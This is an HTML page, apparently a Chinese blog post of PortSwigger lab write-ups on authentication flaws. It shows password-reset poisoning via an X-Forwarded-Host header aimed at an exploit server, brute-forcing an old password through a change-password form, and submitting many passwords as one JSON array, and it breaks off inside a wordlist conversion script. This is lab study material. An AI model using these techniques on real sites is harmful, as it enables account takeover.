<p><img decoding="async" loading="lazy" alt="image-20250506123950291" src="data:image/png;base64,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AEAh4iYAAAAUIm4CAABAIeImAAAAFCJuAgAAQCHiJgAAABQibgIAAEAh4iYAAAAUIm4CAABAIeImAAAAFCJuAgAAQCHiJgAAABQibgIAAEAh4iYAAAAUIm4CAABAIeImAAAAFCJuAgAAQCHiJgAAABQibgIAAEAh4iYAAAAUIm4CAABAIeImAAAAFCJuAgAAQCHiJgAAABQibgIAAEAh4iYAAAAUIm4CAABAIeImAAAAFCJuAgAAQCHiJgAAABQibgIAAEAh4iYAAAAUIm4CAABAIeImAAAAFCJuAgAAQCHiJgAAABQibgIAAEAh4iYAAAAUIm4CAABAIeImAAAAFCJuAgAAQCHiJgAAABQibgIAAEAh4iYAAAAUIm4CAABAIeImAAAAFCJuAgAAQCHiJgAAABQibgIAAEAh4iYAAAAUIm4CAABAIeImAAAAFCJuAgAAQCHiJgAAABQibgIAAEAh4iYAAAAUIm4CAABAIeImAAAAFCJuAgAAQCHiJgAAABQibgIAAEAh4iYAAAAUIm4CAABAIeImAAAAFCJuAgAAQCHiJgAAABQibgIAAECh/w9ZdT0yDEbwUwAAAABJRU5ErkJggg==" width="890" height="256" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="通过中间件进行密码重置中毒">通过中间件进行密码重置中毒<a href="#通过中间件进行密码重置中毒" class="hash-link" aria-label="通过中间件进行密码重置中毒的直接链接" title="通过中间件进行密码重置中毒的直接链接">​</a></h3>
<p>用/户 <code>carlos</code> 会不小心点击他收到的电子邮件中的任何链接</p>
<p><code>POST /forgot-password</code>数据包，支持 <code>X-Forwarded-Host</code> 头部，您可以使用它将动态生成的 reset 链接指向任意域。</p>
<p>指向自己的漏洞服务器</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">X-Forwarded-Host: exploit-0a81007603767cdb806c02c3015900e5.exploit-server.net</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>查看访问日志</p>
<p><img decoding="async" loading="lazy" alt="image-20250506133714667" src="/assets/images/image-20250506133714667-abd7e3169b4c71b83f6bd3c7594b08a1.png" width="1896" height="267" class="img_ev3q"></p>
<p>重置密码即可</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="通过密码更改暴力破解密码">通过密码更改暴力破解密码<a href="#通过密码更改暴力破解密码" class="hash-link" aria-label="通过密码更改暴力破解密码的直接链接" title="通过密码更改暴力破解密码的直接链接">​</a></h3>
<p>自己的凭据: <code>wiener:peter</code></p>
<p>受害者的用户名: <code>carlos</code></p>
<p>登陆上自己的账号，发现有修改密码的功能</p>
<p><img decoding="async" loading="lazy" alt="image-20250506133954085" src="/assets/images/image-20250506133954085-a627891881bef9f16181073fa57048cf.png" width="1333" height="831" class="img_ev3q"></p>
<p>修改username为<code>carlos</code>，观察响应，提示原密码不正确</p>
<p><img decoding="async" loading="lazy" alt="image-20250506134802983" src="/assets/images/image-20250506134802983-49fcb5b5db8a27c2aa13dbdf7e365653.png" width="1472" height="662" class="img_ev3q"></p>
<p>原密码正确，重复新密码不一致</p>
<p><img decoding="async" loading="lazy" alt="image-20250506134914384" src="/assets/images/image-20250506134914384-27aba488f01148f0626ebd9ebcbe1fbe.png" width="1484" height="620" class="img_ev3q"></p>
<p>构造新密码不一致，通过爆破原密码，找到正确原密码</p>
<p><img decoding="async" loading="lazy" alt="image-20250506135230036" src="/assets/images/image-20250506135230036-c9a3cf395555919c059d0478556270b6.png" width="1733" height="696" class="img_ev3q"></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">carlo:biteme</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="密码爆破每个请求多个凭据">密码爆破，每个请求多个凭据<a href="#密码爆破每个请求多个凭据" class="hash-link" aria-label="密码爆破，每个请求多个凭据的直接链接" title="密码爆破，每个请求多个凭据的直接链接">​</a></h3>
<p>提交数据是json格式</p>
<p>密码可以整一个数组直接全部提交</p>
<p><img decoding="async" loading="lazy" alt="image-20250506140845008" src="/assets/images/image-20250506140845008-325edcd1b5a0f0b5a8aca6814be83350.png" width="1452" height="700" class="img_ev3q"></p>
<p>数据转换脚本</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">trans_file_string_to_be_string</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    s</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;r&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token 